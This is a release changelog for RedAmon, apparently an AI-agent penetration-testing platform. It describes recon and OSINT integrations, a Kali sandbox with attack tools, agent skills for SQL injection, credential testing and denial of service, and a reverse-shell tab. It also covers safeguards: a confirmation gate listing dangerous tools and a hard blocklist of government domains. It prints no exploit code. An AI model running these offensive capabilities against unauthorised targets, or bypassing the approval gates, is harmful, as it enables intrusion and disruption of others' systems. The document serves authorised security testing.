- **Claude Code proxy and provider** -- removed the host-side FastAPI proxy (`claude_proxy/server.py`), the `claude_code` LLM provider type, `ClaudeCodeToolManager`, auto-fallback logic, Docker credential mounts, and all related frontend/settings code. The OAuth token used by Claude Code is scoped to `user:sessions:claude_code` -- using it outside Claude Code is against Anthropic's Terms of Service. Users should use the existing Anthropic provider with a standard API key from console.anthropic.com

- **OSINT agent tools** -- removed 7 incomplete tool manager classes (Censys, FOFA, OTX, Netlas, VirusTotal, ZoomEye, CriminalIP) from the agent. Missing 7 of 13 required integration steps (no TOOL_REGISTRY entries, no Tool Matrix UI, no stealth rules, no execute() dispatch). The recon pipeline integration for these services is unaffected. See `PROMPT.ADD_AGENTIC_TOOL.md` for the full integration checklist if re-adding later

- **Always-on specialist skills injection** -- removed the `AGENT_SKILLS` project setting, `agentSkills` Prisma column, `build_skills_prompt_section()`, and the AgentBehaviourSection skill pills UI. Replaced by the on-demand Chat Skills system above

---

## [3.2.0] - 2026-03-31

### Added

- **Uncover Multi-Engine Target Expansion** -- ProjectDiscovery's [uncover](https://github.com/projectdiscovery/uncover) integrated as GROUP 2b in the recon pipeline, running before Shodan and port scanning to expand the target surface. Queries up to 13 search engines simultaneously to discover exposed hosts, IPs, and endpoints associated with the target domain:
  - **Engines:** Shodan, Censys, FOFA, ZoomEye, Netlas, CriminalIP (reuses existing pipeline keys) + Quake, Hunter, PublicWWW, HunterHow, Google Custom Search, Onyphe, Driftnet (uncover-specific keys)
  - **Smart key reuse:** automatically picks up API keys already configured for standalone OSINT enrichment modules -- no extra configuration needed if you already have Shodan/Censys/FOFA/etc. keys
  - **Docker-in-Docker:** runs `projectdiscovery/uncover:latest` container with a dynamically generated `provider-config.yaml` containing only engines with valid credentials
  - **Engine-aware parsing:** handles per-engine quirks -- Google's URL-in-IP field, PublicWWW's host-only results (no IP), Censys URL endpoints. All three previously produced silent data loss
  - **URL discovery:** captures in-scope URLs from engines that populate the `url` field (Censys, PublicWWW, Google), stored as Endpoint nodes in Neo4j
  - **Pipeline merge:** discovered subdomains are injected into `dns.subdomains` so all downstream modules (port scan, HTTP probe, OSINT enrichment) process them automatically. New IPs are added to `metadata.expanded_ips`
  - **Neo4j graph:** `update_graph_from_uncover()` in `osint_mixin.py` creates Subdomain, IP, Port, and Endpoint nodes with source tracking (`uncover_sources`, `uncover_source_counts`, `uncover_total_raw`, `uncover_total_deduped`)
  - **Frontend:** embedded in OsintEnrichmentSection with enable/disable toggle and max results (1-10,000). Settings page groups uncover-specific keys under "Uncover (Multi-Engine Search)" with `Standalone + Uncover` badges on shared keys
  - **Prisma schema:** `uncoverEnabled`, `uncoverMaxResults`, `uncoverDockerImage` fields + 8 API key fields in UserGlobalSettings (Quake, Hunter, PublicWWW, HunterHow, Google key+CX, Onyphe, Driftnet)
  - **Tests:** 42 unit tests covering provider config, deduplication, host/IP extraction, Google/PublicWWW quirks, URL collection, merge logic, isolated wrapper

- **Centralized IP Filtering (`ip_filter.py`)** -- shared module replacing duplicate inline filtering across all OSINT enrichment modules:
  - `is_non_routable_ip()` -- filters RFC 1918 private, loopback, link-local, CGNAT (100.64.0.0/10), multicast, reserved ranges
  - `collect_cdn_ips()` -- gathers IPs flagged as CDN by Naabu/httpx from port scan and HTTP probe data
  - `filter_ips_for_enrichment()` -- single entry point used by all 9 enrichment modules (Shodan, Censys, FOFA, OTX, Netlas, VirusTotal, ZoomEye, CriminalIP, Uncover) to skip non-routable and CDN IPs before making external API calls
  - 22 unit tests covering all IP classification categories, CDN collection, and filtering combinations

- **Censys Platform API v3 Migration** -- migrated from deprecated Basic Auth (`API_ID:API_SECRET`) to Bearer token auth (`CENSYS_API_TOKEN` + `CENSYS_ORG_ID`). Both the recon pipeline enrichment module and the AI agent's `censys_lookup` tool now use the Platform API v3 (`api.platform.censys.io/v3/global`). Old credentials are consolidated via database migration

- **CriminalIP Agent Tool** -- added `criminalip_lookup` to the AI agent's tool registry for interactive IP threat intelligence queries

- **Playwright Browser Automation (MCP Tool)** -- headless Chromium browser automation exposed as an MCP tool (`execute_playwright`) on port 8005 inside the Kali sandbox. Enables the AI agent to interact with JavaScript-rendered pages, SPAs, and dynamic web applications that curl cannot handle:
  - **Two modes:** Content extraction (navigate URL, extract rendered text/HTML with optional CSS selector) and Script mode (run multi-step Playwright Python code with pre-initialized `browser`, `context`, `page` variables)
  - **Backend:** `mcp/servers/playwright_server.py` MCP server using FastMCP, subprocess-based script execution with ANSI stripping, 45s timeout for content mode, 60s for scripts
  - **Docker:** Playwright + Chromium installed in kali-sandbox Dockerfile, headless with `--no-sandbox` and Chrome 120 user-agent. Server registered in `run_servers.py` on port 8005
  - **Agent integration:** configured in `agentic/tools.py` as MCP server (SSE transport, 60s connection / 120s read timeout), documented in `tool_registry.py` with both modes and examples
  - **Phase restrictions:** allowed in all phases (informational, exploitation, post_exploitation). Marked as a **dangerous tool** requiring manual confirmation before execution
  - **Stealth mode:** restricted to single-URL operations only -- no crawling, bulk scraping, or credential spraying. Maximum 2 form submissions per target
  - **Output:** max 15,000 chars per extraction, truncated with notice. Script mode captures stdout with filtered Playwright verbose logging

### Fixed

- **Silent data loss in uncover** -- Google engine results (URL in IP field) and PublicWWW results (no IP, host-only) were silently dropped by deduplication. Fixed with engine-aware parsing that extracts hostnames from URLs and uses `(host, port)` fallback dedup key
- **Graph data loss in uncover** -- `sources`, `source_counts`, `total_raw`, `total_deduped` metadata fields were collected but never written to Neo4j nodes. All fields now stored on Subdomain and IP nodes
- **Logging format violations in uncover** -- replaced `logger.info()`/`logger.error()` calls with standard `print("[symbol][Uncover]")` format per pipeline conventions
- **Missing Prisma schema field** -- `uncoverDockerImage` was in Python settings but missing from Prisma schema, causing frontend/DB desync
- **Missing nodeMapping entries** -- Uncover was not listed in `SECTION_INPUT_MAP` / `SECTION_NODE_MAP`, breaking the graph visualization node info tooltips

---

## [3.1.4] - 2026-03-29

### Added

- **Nmap Service Detection & NSE Vulnerability Scripts** -- deep service version detection (`-sV`) and NSE vulnerability scripts (`--script vuln`) integrated into the recon pipeline as GROUP 3.5, running after port discovery and before HTTP probing. Only scans ports already discovered as open by Masscan/Naabu. Full multi-layer integration:
  - **Backend**: `recon/nmap_scan.py` module with `run_nmap_scan()` orchestration, XML output parsing, CVE extraction from NSE script output (regex `CVE-\d{4}-\d+`), and thread-safe `run_nmap_scan_isolated()` wrapper
  - **Pipeline**: runs after port_scan merge, enriches `port_scan.port_details` with product/version/CPE/scripts via `merge_nmap_into_port_scan()`, updates `port_scan.scan_metadata.scanners` to include "nmap"
  - **Neo4j graph**: `update_graph_from_nmap()` enriches Port nodes (product, version, CPE, nmap_scanned flag), creates Technology nodes (`(Service)-[:USES_TECHNOLOGY]->(Technology)`, `(Port)-[:HAS_TECHNOLOGY]->(Technology)`), creates Vulnerability nodes from NSE findings (`(Vulnerability)-[:AFFECTS]->(Port)`, `(Vulnerability)-[:FOUND_ON]->(Technology)`), and creates CVE nodes from NSE-detected CVEs (`(Vulnerability)-[:HAS_CVE]->(CVE)`, `(Technology)-[:HAS_KNOWN_CVE]->(CVE)`)
  - **CVE lookup**: Nmap-detected service versions (product/version from `services_detected[]`) feed into the CVE lookup pipeline for NVD/Vulners enrichment
  - **Docker**: nmap installed via `apt-get` in recon Dockerfile, NSE scripts included
  - **Frontend**: `NmapSection.tsx` with enable/disable toggle, version detection (-sV) toggle, NSE vulnerability scripts toggle, timing template dropdown (T1-T5), total timeout, and per-host timeout settings
  - **Prisma schema**: 6 new fields -- `nmapEnabled`, `nmapVersionDetection`, `nmapScriptScan`, `nmapTimingTemplate`, `nmapTimeout`, `nmapHostTimeout`
  - **Settings**: 6 configurable parameters with stealth mode overrides (timing T2, scripts disabled)
  - **Output structure**: `nmap_scan` key with `scan_metadata`, `by_host` (port details with service/version/CPE/scripts), `services_detected[]`, `nse_vulns[]`, and `summary`
  - **Tests**: comprehensive test suite in `recon/tests/test_nmap_scan.py` covering target extraction, command construction, XML parsing, CVE extraction, and edge cases

---

## [3.1.3] - 2026-03-29

### Fixed

- **GVM scan stuck at 0%** -- `ospd-openvas` tried to connect to an MQTT broker (`[Errno 111] Connection refused`) because it was missing the `--notus-feed-dir` flag. Without it, the container defaults to MQTT-based notus communication which requires a Mosquitto broker we don't run. Added the official Greenbone `command` with `--notus-feed-dir /var/lib/notus/advisories` so ospd-openvas handles notus locally, matching the upstream community edition compose ([#78](https://github.com/user/redamon/issues/78))
- **GVM button enabled without GVM installed** -- users who installed without `--gvm` still saw an active GVM Scan button. Added a `/health` availability check (`gvm_available`) from the recon orchestrator that detects whether `gvmd` is running, exposed via `/api/gvm/available`, and wired into the toolbar to disable the button with a descriptive tooltip when GVM is not installed

---

## [3.1.2] - 2026-03-29

### Added

- **Surface Shaper** -- natural language attack surface scoping. Describe a subgraph in plain English and the AI generates a read-only Cypher query that carves out a focused slice of the reconnaissance graph. Active surfaces scope Graph Map, Data Table, bottom bar stats, and the AI agent's `query_graph` tool:
  - Split-panel creation page with form on left and live graph preview on right
  - 20 example queries organized by category (Infrastructure, Vulnerabilities, Web Application, Threat Intelligence, Attack Chains) via dropdown menu
  - Save & Select button to instantly activate a surface and switch to Graph Map
  - Unified filter group control in tab bar (create + select as segmented element)
  - Write operation guard (CREATE, MERGE, DELETE blocked) on both webapp execute endpoint and agent tools
  - Bottom bar dynamically reflects active surface (node types, counts, sessions, stats)

- **API Security Testing Tools in Kali Sandbox** -- 6 new tools available via `kali_shell` for API and web security testing:
  - **ffuf** v2.1.0 -- fast web fuzzer for API endpoint/parameter discovery ([MIT](https://github.com/ffuf/ffuf))
  - **httpx** v1.9.0 (ProjectDiscovery) -- HTTP probing, tech detection, header analysis ([MIT](https://github.com/projectdiscovery/httpx))
  - **jwt_tool** v2.3.0 -- JWT exploitation: alg:none, key confusion, secret cracking ([GPL-3.0](https://github.com/ticarpi/jwt_tool))
  - **graphql-cop** -- GraphQL security auditor ([BSD-3-Clause](https://github.com/dolevf/graphql-cop))
  - **graphqlmap** -- GraphQL exploitation scripting engine ([MIT](https://github.com/swisskyrepo/GraphQLmap))
  - **dalfox** -- XSS vulnerability scanner with WAF bypass, DOM-based and blind XSS support ([MIT](https://github.com/hahwul/dalfox))

---

## [3.1.1] - 2026-03-27

### Added

- **Community Skills** -- new section in wiki and Global Settings UI linking to community-contributed attack skill templates (API testing, XSS, SQLi, SSRF)

### Fixed

- **httpx PATH shadowing** -- ProjectDiscovery Go httpx was shadowed by Python httpx CLI wrapper in the Kali sandbox PATH; fixed via symlink override
- **Python httpx removal** -- removed incorrect `pip uninstall httpx` from Dockerfile that would have broken MCP server SSE transport

---

## [3.1.0] - 2026-03-25

### Added

- **Masscan High-Speed Port Scanner** — integrated Masscan as a parallel port scanner alongside Naabu, with NDJSON output parsing, result merging/deduplication, and full multi-layer integration:
  - **Backend**: `recon/masscan_scan.py` module with `run_masscan_scan()` and thread-safe `run_masscan_scan_isolated()` for parallel execution
  - **Pipeline**: Masscan and Naabu run concurrently in the same `ThreadPoolExecutor` fan-out group, results merged via `merge_port_scan_results()` into the unified `port_scan` key for downstream consumers (HTTP probe, graph DB, vuln scan)
  - **Docker**: Masscan built from source in a multi-stage `recon/Dockerfile` build; installed via apt in `kali-sandbox/Dockerfile` for AI agent use
  - **Frontend**: `MasscanSection.tsx` with header enable/disable toggle (Katana pattern), rate, ports, wait, retries, banners, and exclude targets controls
  - **Naabu enable/disable toggle**: added `naabuEnabled` setting across all layers (Prisma, project_settings, frontend header toggle) — both scanners enabled by default
  - **Both-disabled warning**: frontend alert + pipeline log warning when both port scanners are toggled off
  - **AI agent**: `execute_masscan` MCP tool registered in `network_recon_server.py` and `tool_registry.py`
  - **Stealth mode**: Masscan disabled, Naabu switches to passive mode
  - **53 unit tests** covering NDJSON parsing, command construction, result merging, IP/domain mode, mock hostname normalization, and mocked subprocess lifecycle

- **TruffleHog Secret Scanner** — deep credential scanning with 700+ detectors and automatic credential verification via the TruffleHog Docker container (`trufflesecurity/trufflehog`). Scans GitHub repositories for leaked secrets (API keys, passwords, tokens, certificates) and verifies whether discovered credentials are still active. Full multi-layer integration:
  - **Backend**: `trufflehog_scan/` service with SSE streaming progress, Docker-in-Docker execution, and JSON output parsing
  - **Neo4j graph**: new node types `TrufflehogScan`, `TrufflehogRepository`, and `TrufflehogFinding` with relationships `(:TrufflehogScan)-[:SCANNED_REPO]->(:TrufflehogRepository)-[:HAS_FINDING]->(:TrufflehogFinding)`
  - **Frontend**: real-time SSE progress via `useTrufflehogSSE` hook, scan status polling via `useTrufflehogStatus` hook, results displayed in the graph dashboard
  - **API**: `/api/trufflehog` routes for triggering scans, streaming progress, and retrieving results

- **"Other Scans" Modal** — new modal in the graph toolbar (`OtherScansModal`) that consolidates GitHub Hunt and TruffleHog scanning into a single launch point accessible from the graph page toolbar.

- **GitHub Access Token moved to Global Settings** — the GitHub access token is now configured once in Global Settings and shared by both GitHub Secret Hunt and TruffleHog, eliminating duplicate token configuration per scan type.

- **SQL Injection Agent Skill** (`sql_injection`) — new built-in agent skill for SQL injection testing, replacing the previous `sql_injection-unclassified` fallback with a structured 7-step workflow.

- **Agent skill workflows injected from informational phase** — all built-in skill prompts (CVE, SQLi, Credential Testing, DoS, Social Engineering) are now injected from the start of a session, matching user skill behavior. Previously, skill workflows only appeared after transitioning to exploitation phase, causing the agent to improvise without guidance during recon.

- **Phase transition guidance in skill prompts** — each built-in skill now includes an explicit instruction to request `transition_phase` to exploitation after initial recon, ensuring the agent moves through the phase model correctly.

- **Improved classification for informational requests** — the LLM classifier now always determines the best-matching agent skill regardless of phase. Pure recon requests (e.g., "show attack surface") classify as `recon-unclassified` instead of defaulting to `cve_exploit`.

- **AI-Assisted Development wiki page** — new contributor guide with two structured integration prompts (`ADD_AGENTIC_TOOL`, `ADD_RECON_TOOL`) and a 7-step iterative workflow for shipping zero-bug PRs using Claude Code. See [Wiki: AI-Assisted Development](https://github.com/samugit83/redamon/wiki/AI-Assisted-Development).

- **7 OSINT Threat Intelligence Enrichment Tools** — passive enrichment phase (GROUP 3b) running in parallel with port scanning. All 7 modules use a fan-out `ThreadPoolExecutor` pattern, support rate-limit detection (HTTP 429), optional API key rotation, and write results to `recon_domain.json` + Neo4j graph:
  - **Censys** (`censys_enrich.py`) — queries the Censys Search API v2 (`/v2/hosts/{ip}`) for each discovered IP. Returns open ports, services, banners, TLS certificate chains, geolocation, ASN, and OS. Requires `CENSYS_API_ID` + `CENSYS_API_SECRET` (Basic Auth). Both keys stored in Global Settings.
  - **FOFA** (`fofa_enrich.py`) — queries the FOFA Search API using base64-encoded query syntax (`domain="<domain>"` or per-IP). Returns IP:port pairs, HTTP titles, server headers, geolocation, certificate info, and protocol details. Supports legacy (`email:key`) and modern (`key`-only) authentication formats. Max 10,000 results per query. Supports key rotation via `FOFA_KEY_ROTATOR`.
  - **OTX / AlienVault Open Threat Exchange** (`otx_enrich.py`) — queries the OTX Indicators API v1 for IPs and domains. Returns threat reputation, associated malware families, MITRE ATT&CK attack IDs, passive DNS history, pulse data (adversaries, tags, TLP). Supports anonymous requests (1,000 req/hr) or with API key (10,000 req/hr). **Enabled by default** — the only OSINT tool active without an API key. Supports key rotation.
  - **Netlas** (`netlas_enrich.py`) — queries the Netlas Responses API (`host:{domain}` or `host:{ip}`) for internet-connected asset intelligence. Returns port/service data, HTTP response metadata, geolocation (lat/lon, timezone), TLS certificate details, DNS records, and WHOIS data. Max 1,000 results. Supports key rotation.
  - **VirusTotal** (`virustotal_enrich.py`) — queries the VirusTotal API v3 for domain and IP reputation. Returns reputation scores, last analysis stats (malicious/suspicious/undetected counts), categories, tags, JARM fingerprint, registrar, and last analysis date. Free-tier rate limit: 4 requests/minute (configurable via `VIRUSTOTAL_RATE_LIMIT`). On 429, automatically sleeps 65 seconds and retries once. Configurable `VIRUSTOTAL_MAX_TARGETS` (default 20) caps API usage per scan.
  - **ZoomEye** (`zoomeye_enrich.py`) — queries the ZoomEye API for hostname and IP searches. Returns open ports, service banners, device type/OS, web application fingerprints, geolocation (country, city, lat/lon, timezone), ASN, ISP, and SSL certificate info. Max 1,000 results. Supports key rotation.
  - **CriminalIP** (`criminalip_enrich.py`) — queries the Criminal IP API v1 (`/v1/ip/data?full=true`, `/v1/domain/data`) for IP and domain intelligence. Returns risk score, threat tags (VPN, cloud, Tor, proxy, hosting, mobile, darkweb, scanner, Snort IDS), geolocation, ISP, hosted services, and abuse history. On 429, sleeps 2 seconds and retries once.
  - **API Keys**: all 7 tool API keys are stored in **Global Settings > API Keys** (user-scoped). Project settings contain only enable/disable toggles and optional limits (max results, rate limits, max targets).
  - **Key Rotation**: FOFA, OTX, Netlas, VirusTotal, ZoomEye, and CriminalIP support automatic round-robin key rotation via the Global Settings key rotation UI.
  - **Unit tests**: 7 test files in `tests/` covering all enrichment modules (mocked HTTP, rate limit handling, key rotation, graph update functions).

### Fixed

- **Duplicate tool widget replacement** — fixed a bug where the second call to the same tool (e.g., two `execute_curl` calls) would overwrite the first widget in the chat timeline. Root cause: streaming event dedup key only used `tool_name`, causing the second `tool_start` to be deduplicated away. Fix: include `tool_args` in the dedup key.

- **Tool completion ordering** — fixed a race condition where `TOOL_CONFIRMATION_REQUEST` for the next tool arrived before `TOOL_COMPLETE` for the previous tool, causing the confirmation handler to overwrite the previous tool's widget. Fix: reordered streaming events so `tool_complete` always fires before `tool_confirmation`.

---

## [3.0.0] - 2026-03-15

### Added

- **Custom Nuclei Templates Integration** — custom nuclei templates (`mcp/nuclei-templates/`) are now manageable via the UI with per-project selection, dynamically discovered by the agent, and included in automated recon scans:
  - **Template Upload UI**: upload, view, and delete custom `.yaml`/`.yml` nuclei templates directly from Project Settings → Nuclei → Template Options. Templates are global (shared across all projects). Upload validates nuclei template format (requires `id:` and `info:` with `name:` and `severity:`). API: `GET/POST/DELETE /api/nuclei-templates`
  - **Per-project template selection**: each template has a checkbox — only checked templates are included in that project's automated scans. Stored as `nucleiSelectedCustomTemplates` String[] per project (default: `[]`). Different projects can enable different templates from the same global pool
  - **Agent discovery**: at startup, the nuclei MCP server scans `/opt/nuclei-templates/` and dynamically appends all template paths (id, severity, name) to the `execute_nuclei` tool description, so the agent automatically knows what custom templates are available
  - **Recon pipeline**: selected templates are individually passed as `-t /custom-templates/{path}` flags to nuclei. Recon logs list each selected template by name
  - **Spring Boot Actuator templates** (community PR #69): 7 detection templates with 200+ WAF bypass paths for `/actuator`, `/heapdump`, `/env`, `/jolokia`, `/gateway` endpoints — URL encoding, semicolon injection, path traversal, and alternate base path evasion techniques

- **SSL Verify Toggle for OpenAI-compatible LLM Providers** (community PR #70) — `sslVerify` boolean (default: `true`) lets users skip SSL certificate verification when connecting to internal/self-hosted LLM endpoints with self-signed certificates. Full stack: Prisma schema, API route, frontend checkbox, agent `httpx.Client(verify=False)` injection.

- **Dockerfile `DEBIAN_FRONTEND=noninteractive`** (community PR #63) — added to `agentic`, `recon_orchestrator`, and `guinea_pigs` Dockerfiles to suppress interactive `apt-get` prompts during builds.

- **ParamSpider Passive Parameter Discovery** — mines the Wayback Machine CDX API for historically-documented URLs containing query parameters. Only returns parameterized URLs (with `?key=value`), with values replaced by a configurable placeholder (default `FUZZ`), making results directly usable for fuzzing. Runs in Phase 4 (Resource Enumeration) in parallel with Katana, Hakrawler, and GAU. Passive — no traffic to target. No API keys required. Disabled by default; stealth mode auto-enables it. Full stack integration:
  - **Backend**: `paramspider_helpers.py` with `run_paramspider_discovery()` (subprocess per domain, stdout + file output parsing, scope filtering, temp dir cleanup) and `merge_paramspider_into_by_base_url()` (sources array merge, parameter enrichment, deduplication)
  - **Settings**: 3 user-configurable `PARAMSPIDER_*` settings (enabled, placeholder, timeout)
  - **Frontend**: `ParamSpiderSection.tsx` with enable toggle, placeholder input, timeout setting
  - **Stealth mode**: auto-enabled (passive tool, queries Wayback Machine only)
  - **Tests**: 22 unit tests covering merge logic, subprocess mocking, scope filtering, method merging, legacy field migration, settings, stealth overrides

- **Arjun Parameter Discovery** — discovers hidden HTTP query and body parameters on endpoints by testing ~25,000 common parameter names. Runs in Phase 4 (Resource Enumeration) after FFuf, testing discovered endpoints from crawlers/fuzzers rather than just base URLs. Disabled by default; stealth mode forces passive-only; RoE caps rate. Full stack integration:
  - **Backend**: `arjun_helpers.py` with multi-method parallel execution via `ThreadPoolExecutor` — each selected method (GET/POST/JSON/XML) runs as a separate Arjun subprocess simultaneously
  - **Discovered endpoint feeding**: collects full endpoint URLs from Katana + Hakrawler + jsluice + FFuf results, prioritizes API and dynamic endpoints, caps to configurable max (default 50)
  - **Settings**: 12 user-configurable `ARJUN_*` settings (methods, max endpoints, threads, timeout, chunk size, rate limit, stable mode, passive mode, disable redirects, custom headers)
  - **Frontend**: `ArjunSection.tsx` with multi-select method checkboxes, max endpoints field, scan parameters, stable/passive/redirect toggles, custom headers textarea
  - **Stealth mode**: forces `ARJUN_PASSIVE=True` (CommonCrawl/OTX/WaybackMachine only, no active requests to target)
  - **Tests**: 29 unit tests covering merge logic, multi-method parallel execution, scope filtering, command building, settings consistency, stealth/RoE overrides

- **FFuf Directory Fuzzer** — brute-force directory/endpoint discovery using wordlists, complementing crawlers (Katana, Hakrawler, GAU) by finding hidden content (admin panels, backup files, configs, undocumented APIs). Runs in Phase 4 (Resource Enumeration) after jsluice and before Kiterunner. Disabled by default; stealth mode disables it; RoE caps rate. Full stack integration:
  - **Backend**: `ffuf_helpers.py` with `run_ffuf_discovery()`, JSON output parsing, scope filtering, deduplication, and smart fuzzing under crawler-discovered base paths
  - **Dockerfile**: multi-stage Go 1.22 build compiles FFuf from source, installs 3 SecLists wordlists (`common.txt`, `raft-medium-directories.txt`, `directory-list-2.3-small.txt`)
  - **Settings**: 16 user-configurable `FFUF_*` settings (threads, rate, timeout, wordlist, match/filter codes, extensions, recursion, auto-calibrate, smart fuzz, custom headers)
  - **Frontend**: `FfufSection.tsx` with full settings UI, wordlist dropdown (built-in SecLists + custom uploads), custom wordlist upload/delete via API
  - **Custom wordlists**: upload `.txt` wordlists per-project via `/api/projects/[id]/wordlists` (GET/POST/DELETE), shared between webapp and recon containers via Docker volume mount
  - **Validation**: frontend form validation for FFuf status codes (100-599), header format, numeric ranges, extensions format, recursion depth (1-5)
  - **Tests**: 43 unit tests covering helpers, settings, stealth/RoE overrides, sanitization, and CRUD operations

- **RedAmon Terminal** — interactive PTY shell access to the kali-sandbox container directly from the graph page via xterm.js. Provides full Kali Linux terminal with all pre-installed pentesting tools (Metasploit, Nmap, Nuclei, Hydra, sqlmap, etc.) without leaving the browser. Architecture: Browser (xterm.js) → WebSocket → Agent FastAPI proxy (`/ws/kali-terminal`) → kali-sandbox terminal server (PTY `/bin/bash` on port 8016):
  - **Terminal server**: `terminal_server.py` — WebSocket PTY server using `os.fork` + `pty` module with async I/O via `loop.add_reader()`, connection limits (max 5 sessions), resize validation (clamped 1-500), process group cleanup, and `asyncio.Event` for clean shutdown
  - **Agent proxy**: `/ws/kali-terminal` WebSocket endpoint in `api.py` — bidirectional relay with proper task cancellation (`asyncio.gather` with `return_exceptions`)
  - **Frontend**: `KaliTerminal.tsx` — React component with dark Ayu theme, connection status indicator, auto-reconnect with exponential backoff (5 attempts), fullscreen toggle, browser-side keepalive ping (30s), proper xterm.js teardown, ARIA accessibility attributes
  - **Docker**: port 8016 bound to localhost only (`127.0.0.1:8016:8016`), `TERMINAL_WS_PORT` and `KALI_TERMINAL_WS_URL` env vars
  - **Tests**: 18 Python + TypeScript unit tests covering resize clamping, connection limits, URL derivation, reconnect logic

- **"Remote Shells" renamed to "Reverse Shell"** — tab renamed for clarity to distinguish from the new RedAmon Terminal tab. The Reverse Shell tab manages agent-opened sessions (meterpreter, netcat, etc.), while RedAmon Terminal provides direct interactive sandbox access.

- **Hakrawler Integration** — DOM-aware web crawler running as Docker container (`jauderho/hakrawler`). Runs in parallel with Katana, GAU, and Kiterunner during resource enumeration. Configurable depth, threads, subdomain inclusion, and scope filtering. Disabled automatically in stealth mode.
- **jsluice JavaScript Analysis** — JS analysis tool that downloads and extracts URLs, API endpoints, and embedded secrets (AWS keys, GitHub tokens, GCP credentials, etc.) from discovered JavaScript files. Runs sequentially after the parallel crawling phase.
- **Secret Node in Neo4j** — Generic `Secret` node type linked to `BaseURL` via `[:HAS_SECRET]`. Source-agnostic design supports jsluice now and future secret discovery tools. Includes deduplication, severity classification, and redacted samples.
- **Hakrawler enabled by default** — New projects have Hakrawler and Include Subdomains enabled by default.
- **Tool Confirmation Gate** — per-tool human-in-the-loop safety gate that pauses the agent before executing dangerous tools (`execute_nmap`, `execute_naabu`, `execute_nuclei`, `execute_curl`, `metasploit_console`, `msf_restart`, `kali_shell`, `execute_code`, `execute_hydra`). Full multi-layer integration:
  - **Backend**: `DANGEROUS_TOOLS` frozenset in `project_settings.py`, `ToolConfirmationRequest` Pydantic model in `state.py`, two new LangGraph nodes (`await_tool_confirmation`, `process_tool_confirmation`) in `tool_confirmation_nodes.py`
  - **Orchestrator**: think node detects dangerous tools in both single-tool and plan-wave decisions, sets `awaiting_tool_confirmation` and `tool_confirmation_pending` state, graph pauses at `await_tool_confirmation` (END) and resumes via `process_tool_confirmation` routing to execute_tool/execute_plan (approve), think (reject), or patching tool_args (modify)
  - **WebSocket**: `tool_confirmation` (client→server) and `tool_confirmation_request` (server→client) message types, `ToolConfirmationMessage` model, `handle_tool_confirmation()` handler with streaming resumption
  - **Frontend**: inline **Allow / Deny** buttons on `ToolExecutionCard` (single mode) and `PlanWaveCard` (plan mode) with `pending_approval` status, `awaitingToolConfirmation` state disables chat input, warning badge in chat header when disabled
  - **Settings**: `REQUIRE_TOOL_CONFIRMATION` (default: `true`) toggle in Project Settings → Agent Behaviour → Approval Gates, with autonomous operation risk warning when disabled
  - **Conversation restore**: tool confirmation requests and responses persisted to DB, correctly restored on conversation reload with Allow/Deny buttons re-activated if no subsequent agent work occurred
  - **Prisma schema**: `agentRequireToolConfirmation` Boolean field (default: true)
- **Hard Guardrail** — deterministic, non-disableable domain blocklist for government, military, educational, and international organization domains. Cannot be toggled off regardless of project settings. Implemented identically in Python (`agentic/hard_guardrail.py`) and TypeScript (`webapp/src/lib/hard-guardrail.ts`):
  - Blocks TLD suffix patterns: `.gov`, `.mil`, `.edu`, `.int`, and country-code variants (`.gov.uk`, `.ac.jp`, `.gob.mx`, `.gouv.fr`, etc.)
  - Blocks 300+ exact intergovernmental organization domains on generic TLDs (UN system, EU institutions, development banks, arms control bodies, international courts, etc.)
  - Subdomain matching: blocks all subdomains of exact-blocked domains
  - Provides defense-in-depth alongside the soft LLM-based guardrail

- **Zero-config setup — `.env` file completely removed** — all user-configurable settings (NVD API key, ngrok auth token, chisel server URL/auth) are now managed from the Global Settings UI page and stored in PostgreSQL. No `.env` or `.env.example` file is needed.
  - **Global Settings → API Keys**: NVD, Vulners, and URLScan API keys added alongside Tavily, Shodan, SerpAPI (all user-scoped)
  - **Global Settings → Tunneling**: new section for ngrok and chisel tunnel configuration with live push to kali-sandbox (no container restart needed)
  - **Tunnel Manager API**: lightweight HTTP server on port 8015 inside kali-sandbox that receives tunnel config pushes from the webapp and manages ngrok/chisel processes
  - **Boot-time config fetch**: kali-sandbox fetches tunnel credentials from webapp DB on startup
  - **Bug fix**: NVD API key was never actually passed to CVE lookup function — now correctly wired through

- **Availability Testing Attack Skill** — new built-in attack skill for disrupting service availability. Includes LLM prompt templates for DoS vector selection, resource exhaustion, flooding, and crash exploits. Full integration across the stack:
  - **Backend**: `denial_of_service_prompts.py` with DoS-specific workflow guidance, vector classification, and impact assessment prompts
  - **Orchestrator**: DoS attack path type (`denial_of_service`) integrated into classification, phase transitions, and tool registry
  - **Database**: Prisma schema updated with DoS configuration fields and project-level toggle
  - **Frontend**: `DosSection.tsx` configuration component in the project form for enabling/disabling and tuning DoS parameters
  - **API**: agent skills endpoint updated to expose DoS as a built-in skill

- **Expanded Finding Types** — 8 new goal/outcome `finding_type` values for ChainFinding nodes, covering real-world pentesting outcomes beyond the original 10 types:
  - `data_exfiltration` — data successfully stolen/exfiltrated
  - `lateral_movement` — pivot to another system in the network
  - `persistence_established` — backdoor, cron job, or persistent access installed
  - `denial_of_service_success` — service confirmed down after DoS attack
  - `social_engineering_success` — phishing or social engineering succeeded
  - `remote_code_execution` — arbitrary code execution achieved
  - `session_hijacked` — existing user session taken over
  - `information_disclosure` — sensitive info leaked (source code, API keys, error messages)
  - LLM prompts updated to guide the agent in emitting the correct goal type
  - Analytics and report queries expanded to include all goal types

- **Goal Finding Visualization** — ChainFinding diamond nodes on the attack surface graph now visually distinguish goal/outcome findings from informational ones:
  - **Active chain**: goal diamonds are bright green (`#4ade80`), non-goal diamonds remain amber
  - **Inactive chain**: goal diamonds are dark green (`#276d43`), non-goal diamonds are dark yellow (`#3d3107`), other chain nodes remain dark grey
  - Inactive chain edges and particles darkened for better contrast
  - Active chain particles brighter (`#9ca3af`) for clear visual distinction
  - Applied consistently to both 2D and 3D graph renderers

- **Inline Model Picker** — the model badge in the AI assistant drawer is now clickable, opening a searchable modal to switch LLM model on the fly. Models are grouped by provider with context-length badges and descriptions. Includes a manual-input fallback when the models API is unreachable. Shared model utilities (`ModelOption` type, `formatContextLength`, `getDisplayName`) extracted into `modelUtils.ts` and reused across the drawer and project form.

- **Animated Loading Indicator** — replaced static "Processing..." text in the AI assistant chat with a dynamic loading experience:
  - **RedAmon eye logo** with randomized heartbeat animation (2–6s random intervals)
  - **Color-shifting pupil** cycling through 13 bright colors (yellow, cyan, orange, purple, green, pink, etc.)
  - **60 rotating hacker-themed phrases** displayed in random order every 5 seconds with fade-in animation (e.g., "Unmasking the hidden...", "Piercing the veil...", "Becoming root...")

